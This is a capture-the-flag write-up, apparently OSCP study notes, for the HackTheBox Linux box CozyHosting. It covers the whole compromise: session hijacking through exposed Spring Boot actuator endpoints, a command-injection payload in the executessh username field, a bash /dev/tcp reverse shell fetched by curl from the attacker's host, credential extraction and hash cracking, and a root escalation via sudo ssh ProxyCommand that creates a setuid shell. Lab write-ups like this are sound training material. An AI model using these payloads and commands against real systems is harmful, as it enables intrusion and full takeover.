## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
- Prep: [OSCP](OSCP.md)
## 🔍 Reconnaissance

### ⚛️ Nmap Scanning

```bash
nmap -p- --min-rate 10000 10.10.11.230
```

```
nmap -p 22,80 -sCV 10.10.11.230
```

- Open ports: **22 [SSH](SSH)**, **80 [HTTP](HTTP)**
- Web server: nginx 1.18.0
- Redirect to `cozyhosting.htb` confirms host-based routing

### 🌐 Website Analysis

- Login page sets `JSESSIONID` — confirms Java-based backend
- Site has a Spring Boot default error page on 404

### 🔮 Directory Fuzzing

```bash
feroxbuster -u http://cozyhosting.htb
```

```bash
feroxbuster -u http://cozyhosting.htb -w /opt/SecLists/Discovery/Web-Content/spring-boot.txt
```

- Interesting routes:
    - `/actuator` endpoints (e.g., `/mappings`, `/env`, `/sessions`)
    - `/admin`, `/executessh`, `/addhost`

## 🤖 Shell as `app`

```bash
curl -s http://cozyhosting.htb/actuator/mappings | jq .
```

### 💰 Session Hijacking

- `GET /actuator/sessions` leaks session IDs
- Use cookie in browser dev tools to hijack `kanderson`'s session

### ⚒️ Command Injection via `/executessh`

- POST request to `/executessh` with hostname and username
- Injection through username using `${IFS}` or brace expansion:

```bash
username=0xdf;{ping,-c,1,10.10.14.6};#
```

- Verified ICMP echo via `tcpdump`

### 🛠️ Reverse Shell

1. Serve a reverse shell script:

```bash
bash -i >& /dev/tcp/10.10.14.6/443 0>&1
```

2. Use `curl` from target to download:

```bash
curl http://10.10.14.6/rev.sh -o /tmp/rev.sh
```

3. Trigger execution:
    

```bash
bash /tmp/rev.sh
```

4. Catch shell on listener:

```bash
nc -lnvp 443
```

## 👤 Shell as `josh`

### 🔎 Enumerate Java App

- Found `cloudhosting-0.0.1.jar` running under Java
- Unzipped and extracted `application.properties`

```bash
grep -r password .
```

- Credentials:
    
    - DB: postgres / `Vg&nvzAQ7XxR`
        

### 🔢 Postgres DB Access

```bash
PGPASSWORD='Vg&nvzAQ7XxR' psql -U postgres -h localhost
```

- Found `users` table with bcrypt password hashes
    

### 🔒 Hash Cracking

```bash
hashcat -m 3200 -a 0 -o cracked.txt hashes rockyou.txt
```

- Cracked admin hash: `manchesterunited`
    

### ☕ User Pivot

```bash
su - josh  # or
ssh josh@cozyhosting.htb
```

- Read `/home/josh/user.txt`
    

## 🕵️‍♂️ Privilege Escalation to Root

### 🗜️ Sudo Permission

```bash
sudo -l
```

- Can run `/usr/bin/ssh` as root
    

### 🔀 Exploiting ProxyCommand

```bash
sudo ssh -o ProxyCommand='touch /tmp/owned' x
sudo ssh -o ProxyCommand='cp /bin/bash /tmp/rootbash' x
sudo ssh -o ProxyCommand='chmod 6777 /tmp/rootbash' x
/tmp/rootbash -p
```

- Got root shell!
    
- Read `/root/root.txt`
    

---

## 🔧 Tools Used

- `nmap`
    
- `feroxbuster`
    
- `curl`, `jq`
    
- `Burp Suite`
    
- `hashcat`
    
- `nc`, `tcpdump`
    
- `jd-gui`
    
- `psql`
    

## 📓 Takeaways

- Java Spring Boot is **leaky** with actuator endpoints ⚡
    
- **Session hijacking** via `/actuator/sessions`
    
- **Command injection** via user input using `${IFS}` and brace expansion
    
- `ssh -o ProxyCommand=` is powerful for **root privilege escalation**
    

## 🔗 References

- [Spring Boot Actuator docs](https://docs.spring.io/spring-boot/docs/current/actuator-api/html/)
    
- [GTFObins: ssh](https://gtfobins.github.io/gtfobins/ssh/)
    
- [HackTricks: Command Injection](https://book.hacktricks.xyz/pentesting-web/command-injection)
    
- [jd-gui Java decompiler](https://github.com/java-decompiler/jd-gui/releases)